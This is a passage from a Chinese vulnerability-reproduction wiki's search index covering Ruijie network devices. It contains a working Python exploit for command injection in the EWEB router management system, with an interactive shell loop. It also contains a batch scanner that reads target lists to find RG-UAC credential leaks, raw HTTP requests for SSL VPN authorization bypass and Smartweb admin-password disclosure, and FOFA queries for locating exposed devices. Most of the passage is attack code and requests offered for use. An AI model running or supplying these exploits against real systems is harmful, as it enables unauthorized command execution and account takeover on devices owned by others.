[34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u9510\u6377\u7f51\u7edc-EWEB\u7f51\u7ba1\u7cfb\u7edf \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"mac=1&ip=127.0.0.1| whoami > PeiQi_test.txt\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u6267\u884c\u547d\u4ee4 whoami \\033 [0m\" . format ( target_url )) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = target_url + \"/guest_auth/PeiQi_test.txt\" , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a\uff1a {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/guest_auth/guestIsUp.php\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"mac=1&ip=127.0.0.1| {} > PeiQi_test.txt\" . format ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = target_url + \"/guest_auth/PeiQi_test.txt\" , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a\uff1a \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%20EWEB%E7%BD%91%E7%AE%A1%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2021-09650/#goby--poc","text":"[!NOTE] \u9510\u6377NBR\u8def\u7531\u5668 EWEB\u7f51\u7ba1\u7cfb\u7edf \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","text":"\u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf\u5b58\u5728\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732 CNVD-2021-14536 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf\u5b58\u5728\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732,\u53ef\u4ee5\u95f4\u63a5\u83b7\u53d6\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u767b\u5f55\u540e\u53f0 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf FOFA \u00b6 [!NOTE] title=\"RG-UAC\u767b\u5f55\u9875\u9762\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6765\u5230\u767b\u5f55\u9875\u9762 \u6309F12\u67e5\u770b\u6e90\u7801,\u53ef\u4ee5\u53d1\u73b0\u8d26\u53f7\u548c\u5bc6\u7801\u7684md5\u5f62\u5f0f \u89e3\u5bc6md5\u5f97\u5230\u5bc6\u7801\u540e\u5373\u53ef\u767b\u5f55\u7cfb\u7edf \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"super_admin\" in response . text and \"password\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,F12\u67e5\u770b\u6e90\u7801\u83b7\u53d6\u5bc6\u7801md5\u503c \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf\u5b58\u5728\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u9510\u6377rg-uac\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf\u5b58\u5728\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732-cnvd-2021-14536","text":"","title":"\u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf\u5b58\u5728\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732 CNVD-2021-14536"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf\u5b58\u5728\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u6cc4\u9732,\u53ef\u4ee5\u95f4\u63a5\u83b7\u53d6\u7528\u6237\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f\u767b\u5f55\u540e\u53f0","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#fofa","text":"[!NOTE] title=\"RG-UAC\u767b\u5f55\u9875\u9762\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6765\u5230\u767b\u5f55\u9875\u9762 \u6309F12\u67e5\u770b\u6e90\u7801,\u53ef\u4ee5\u53d1\u73b0\u8d26\u53f7\u548c\u5bc6\u7801\u7684md5\u5f62\u5f0f \u89e3\u5bc6md5\u5f97\u5230\u5bc6\u7801\u540e\u5373\u53ef\u767b\u5f55\u7cfb\u7edf","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7RG-UAC%E7%BB%9F%E4%B8%80%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u9510\u6377RG-UAC\u7edf\u4e00\u4e0a\u7f51\u884c\u4e3a\u7ba1\u7406\u5ba1\u8ba1\u7cfb\u7edf \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"super_admin\" in response . text and \"password\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,F12\u67e5\u770b\u6e90\u7801\u83b7\u53d6\u5bc6\u7801md5\u503c \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7SSL%20VPN%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"\u9510\u6377SSL VPN \u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Ruijie SSL VPN \u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u5df2\u77e5\u7528\u6237\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5bf9\u8d26\u53f7\u8fdb\u884c\u4fee\u6539\u5bc6\u7801\u548c\u7ed1\u5b9a\u624b\u673a\u7684\u64cd\u4f5c\u3002\u5e76\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u67e5\u770b\u670d\u52a1\u5668\u8d44\u6e90 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Ruijie SSL VPN FOFA \u00b6 [!NOTE] icon_hash=\"884334722\" || title=\"Ruijie SSL VPN\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u76ee\u6807 http://xxx.xxx.xxx.xxx/cgi-bin/installjava.cgi POC\u8bf7\u6c42\u5305\u5982\u4e0b GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 \u5176\u4e2d\u6ce8\u610f\u7684\u53c2\u6570\u4e3a Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 UserName \u53c2\u6570\u4e3a\u5df2\u77e5\u7528\u6237\u540d [!NOTE] \u5728\u672a\u77e5\u767b\u5f55\u7528\u6237\u540d\u7684\u60c5\u51b5\u4e0b \u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528(\u6839\u636e\u8bf7\u6c42\u5305\u4f7f\u7528Burp\u8fdb\u884c\u7528\u6237\u540d\u7206\u7834) \u7528\u6237\u540d\u6b63\u786e\u65f6\u4f1a\u8fd4\u56de\u654f\u611f\u4fe1\u606f \u901a\u8fc7\u6b64\u65b9\u6cd5\u77e5\u9053\u7528\u6237\u540d\u540e\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u4fee\u6539\u8d26\u53f7\u53c2\u6570 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres \u70b9\u51fb\u4e2a\u4eba\u8bbe\u7f6e\u8df3\u8f6c\u9875\u9762\u5373\u53ef\u4fee\u6539\u8d26\u53f7\u4fe1\u606f \u53c2\u8003\u6587\u7ae0 \u00b6 https://mp.weixin.qq.com/s?__biz=MzU1NTkzMTYxOQ==&mid=2247484601&idx=1&sn=d6d6f4496243d98e688667faff137973","title":"\u9510\u6377SSL VPN \u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7SSL%20VPN%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u9510\u6377ssl-vpn-\u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":"","title":"\u9510\u6377SSL VPN \u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7SSL%20VPN%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Ruijie SSL VPN \u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u5df2\u77e5\u7528\u6237\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5bf9\u8d26\u53f7\u8fdb\u884c\u4fee\u6539\u5bc6\u7801\u548c\u7ed1\u5b9a\u624b\u673a\u7684\u64cd\u4f5c\u3002\u5e76\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u67e5\u770b\u670d\u52a1\u5668\u8d44\u6e90","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7SSL%20VPN%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Ruijie SSL VPN","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7SSL%20VPN%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] icon_hash=\"884334722\" || title=\"Ruijie SSL VPN\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7SSL%20VPN%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u76ee\u6807 http://xxx.xxx.xxx.xxx/cgi-bin/installjava.cgi POC\u8bf7\u6c42\u5305\u5982\u4e0b GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 \u5176\u4e2d\u6ce8\u610f\u7684\u53c2\u6570\u4e3a Cookie: UserName=xm; SessionId=1; FirstVist=1; Skin=1; tunnel=1 UserName \u53c2\u6570\u4e3a\u5df2\u77e5\u7528\u6237\u540d [!NOTE] \u5728\u672a\u77e5\u767b\u5f55\u7528\u6237\u540d\u7684\u60c5\u51b5\u4e0b \u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528(\u6839\u636e\u8bf7\u6c42\u5305\u4f7f\u7528Burp\u8fdb\u884c\u7528\u6237\u540d\u7206\u7834) \u7528\u6237\u540d\u6b63\u786e\u65f6\u4f1a\u8fd4\u56de\u654f\u611f\u4fe1\u606f \u901a\u8fc7\u6b64\u65b9\u6cd5\u77e5\u9053\u7528\u6237\u540d\u540e\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u4fee\u6539\u8d26\u53f7\u53c2\u6570 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres \u70b9\u51fb\u4e2a\u4eba\u8bbe\u7f6e\u8df3\u8f6c\u9875\u9762\u5373\u53ef\u4fee\u6539\u8d26\u53f7\u4fe1\u606f","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7SSL%20VPN%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"https://mp.weixin.qq.com/s?__biz=MzU1NTkzMTYxOQ==&mid=2247484601&idx=1&sn=d6d6f4496243d98e688667faff137973","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7Smartweb%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"\u9510\u6377Smartweb\u7ba1\u7406\u7cfb\u7edf \u5bc6\u7801\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u9510\u6377\u7f51\u7edc\u80a1\u4efd\u6709\u9650\u516c\u53f8\u65e0\u7ebfsmartweb\u7ba1\u7406\u7cfb\u7edf\u5b58\u5728\u903b\u8f91\u7f3a\u9677\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ece\u6f0f\u6d1e\u83b7\u53d6\u5230\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\uff0c\u4ece\u800c\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u767b\u5f55\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u9510\u6377\u7f51\u7edc\u80a1\u4efd\u6709\u9650\u516c\u53f8 \u65e0\u7ebfsmartweb\u7ba1\u7406\u7cfb\u7edf FOFA \u00b6 [!NOTE] title=\"\u65e0\u7ebfsmartWeb--\u767b\u5f55\u9875\u9762\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u9ed8\u8ba4\u5b58\u5728 guest\u8d26\u6237\uff0c\u8d26\u53f7\u5bc6\u7801\u4e3a guest/guest \u5176\u4e2d\u767b\u5f55\u7684\u8fc7\u7a0b\u4e2d\u641c\u7d22admin\u7684\u6570\u636e\u540e\u53d1\u73b0\u8bf7\u6c42\u4e86\u4e00\u4e2a\u6587\u4ef6 /web/xml/webuser-auth.xml \uff0c\u800c\u4e14\u54cd\u5e94\u4e2d\u5305\u542b\u4e86 admin\u5bc6\u7801\u7684base64\u52a0\u5bc6 \u89e3\u5bc6\u5c31\u53ef\u4ee5\u83b7\u5f97 admin\u7ba1\u7406\u5458\u7684\u5bc6\u7801\uff0c\u5c1d\u8bd5\u76f4\u63a5\u8bf7\u6c42 http://xxx.xxx.xxx.xxx/web/xml/webuser-auth.xml Cookie\u6dfb\u52a0 Cookie: login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest \u76f4\u63a5\u83b7\u5f97\u6240\u6709\u7684\u8d26\u6237\u7684\u7b49\u7ea7\u6807\u5fd7\u548cbase64\u52a0\u5bc6\u7684\u8d26\u53f7\u5bc6\u7801 Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Ruijie_smartweb_password_information_disclosure","title":"\u9510\u6377Smartweb\u7ba1\u7406\u7cfb\u7edf 